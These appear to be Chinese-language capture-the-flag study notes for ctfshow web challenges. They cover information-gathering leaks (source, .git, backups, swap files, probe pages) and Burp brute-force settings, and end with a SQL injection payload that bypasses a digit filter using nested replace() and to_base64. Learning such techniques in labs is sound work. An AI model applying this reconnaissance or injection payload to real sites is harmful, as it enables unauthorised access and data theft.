信息收集

一般收集

前几道题都是常规的信息收集和路径扫描工具可以直接扫出的文件，具体有

  • 源码泄露
    • f12查看源码
  • .git/.svn泄露
    • git/svn hack利用工具，题目中直接访问即可获得flag
  • 备份文件泄露
    • dirsearch扫描敏感路径查找&特征框架/cms 备份文件路径查找
  • robots.txt
    • 网站反爬虫txt文件访问即得
  • vim异常退出泄露
    • 异常退出导致生成当前编辑文件.后缀.swp文件如index.php.swp
  • 网络泄露
    • 返回包信息泄露，服务器/操作系统/语言等
  • cookie/session泄露

社工收集

  • 在目标网站需要登录时我们可以提前阅览整个网站，是否留下邮箱个人 信息等，进行登录等操作
  • 目标网站是否泄露文档，我们可以查看文档进一步获取有用信息
  • DNS泄露，查看当前IP的历史解析记录
  • 浏览器特定语法寻找有关网站的二级域名等信息

其他泄露

  • 探针泄露
    • phpmyadmin
    • 雅黑探针
    • 什么是php探针
      • php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息
    • 使用后若未删除,则可能造成信息泄露
  • sql备份文件泄露
    • backup.sql
  • 密钥泄露
    • 加密算法的密钥偏移量等信息前端保存,导致可以逆向出密码明文
  • js逻辑泄露
    • 通过审计js代码达成目的

总结

在爆破中，各种细节（如28）与字典的选取一定要到位，字典的选取也与前期的信息收集有关
对bp的熟练操作也影响爆破的成败，如对迭代器的运用，狙击手、集束炸弹等爆破模式，还有url编码、爆破线程数等细节的控制等

返回结果处理

既忽略大小写过滤flag，也过滤所有数字，因此要对数字过滤进行绕过

方法一：数字过滤绕过

payload:
-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),"1","@A"),"2","@B"),"3","@C"),"4","@D"),"5","@E"),"6","@F"),"7","@G"),"8","@H"),"9","@I"),"0","@J") from ctfshow_user4 where username = 'flag' --+

思路

由于已经过滤数字，因此常规注入-1' union select 1,2无返回，使用-1' union 'a','b',回显位分别出现’a’,’b’

将所有数字用十个replace()套娃绕过对数字的过滤，从而得到flag:Y@CRmc@Bhvd@Cs@CMDk@EY@BQ@BMC@JzM@BQ@DLTRlNzAtYjhmMS@JyNmUyNTk@JZTE@BNTB9
